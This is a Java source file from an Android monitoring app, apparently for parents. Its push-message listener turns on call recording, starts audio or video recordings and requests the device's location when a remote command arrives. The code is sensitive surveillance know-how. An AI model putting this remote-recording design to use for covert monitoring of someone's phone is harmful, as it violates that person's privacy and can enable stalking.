package com.byteshaft.kidmonitor.services;


import android.content.Intent;
import android.os.Bundle;

import com.byteshaft.kidmonitor.AppGlobals;
import com.byteshaft.kidmonitor.constants.AppConstants;
import com.byteshaft.kidmonitor.utils.RemoteCallsHelpers;
import com.google.android.gms.gcm.GcmListenerService;

public class MyGcmListenerService extends GcmListenerService {

    @Override
    public void onMessageReceived(String from, Bundle data) {
        super.onMessageReceived(from, data);
        if (data == null) {
            return;
        }

        String remoteRequest = data.getString("request");
        String remoteAction = data.getString("action");
        if (remoteRequest == null || remoteAction == null) {
            return;
        }

        System.out.println(String.format("Received %s for %s", remoteAction, remoteRequest));

        switch (remoteAction) {
            case AppConstants.TYPE_CALL_RECORDINGS:
                RemoteCallsHelpers.enableCallRecording(Boolean.valueOf(remoteRequest));
                break;
            case AppConstants.TYPE_SOUND_RECORDINGS:
            case "audio_recordings":
                int duration = Integer.valueOf(remoteRequest);
                if (duration == 0) {
                    return;
                }
                if (AppGlobals.isRecordingCall() || AppGlobals.isVideoRecording() ||
                        AppGlobals.isSoundRecording()) {
                    return;
                }
                Intent intent = new Intent(AppConstants.REQUEST_AUDIO);
                intent.putExtra("duration", duration*10);
                sendBroadcast(intent);
                break;
            case AppConstants.TYPE_VIDEO_RECORDINGS:
                int durationVideo = Integer.valueOf(remoteRequest);
                if (durationVideo == 0) {
                    return;
                }

                if (AppGlobals.isRecordingCall() || AppGlobals.isVideoRecording() ||
                        AppGlobals.isSoundRecording()) {
                    return;
                }
                Intent intentVideo = new Intent(AppConstants.REQUEST_VIDEO);
                intentVideo.putExtra("duration", durationVideo*10);
                sendBroadcast(intentVideo);
                break;
            case "location":
                sendBroadcast(new Intent(AppConstants.REQUEST_LOCATION));
                break;
        }
    }
}
